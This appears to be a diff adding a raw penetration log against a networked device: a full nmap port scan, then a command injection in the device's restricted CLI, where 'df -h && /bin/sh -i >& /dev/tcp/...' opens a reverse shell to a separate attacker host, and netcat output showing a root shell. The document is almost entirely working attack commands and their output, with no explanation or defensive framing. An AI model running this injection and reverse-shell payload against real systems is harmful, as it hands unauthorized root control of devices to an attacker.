@@ -1,0 +1,44 @@
+nmap  -p1-65535 172.16.81.227
+Nmap scan report for 172.16.81.227
+Host is up (0.019s latency).
+Not shown: 63971 filtered tcp ports (no-response), 209 filtered tcp ports (host-prohibited), 1341 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+23/tcp   open  telnet
+80/tcp   open  http
+443/tcp  open  https
+554/tcp  open  rtsp
+1720/tcp open  h323q931
+1721/tcp open  caicci
+4433/tcp open  vop
+6060/tcp open  x11
+7078/tcp open  unknown
+7079/tcp open  unknown
+8092/tcp open  unknown
+8888/tcp open  sun-answerbook
+9000/tcp open  cslistener
+
+Command Line Interface
+
+cli> system
+
+cli(system)> df -h
+鏂囦欢绯荤粺             瀹归噺  宸茬敤  鍙敤 宸茬敤% 鎸傝浇鐐?
+/dev/mapper/cl-root  106G  8.7G   92G    9% /
+devtmpfs             3.8G     0  3.8G    0% /dev
+tmpfs                3.8G  8.0K  3.8G    1% /dev/shm
+tmpfs                3.8G  401M  3.4G   11% /run
+tmpfs                3.8G     0  3.8G    0% /sys/fs/cgroup
+/dev/sda1            477M  115M  333M   26% /boot
+tmpfs                776M     0  776M    0% /run/user/0
+
+cli(system)> df -h && /bin/sh -i >& /dev/tcp/172.16.80.104/1337 0>&1
+
+$ nc -lvnp 1337
+Listening on 0.0.0.0 1337
+Connection received on 172.16.81.227 42914
+sh: 此 shell 中无任务控制
+sh-4.2# id
+id
+uid=0(root) gid=0(root) 组=0(root)
+sh-4.2#
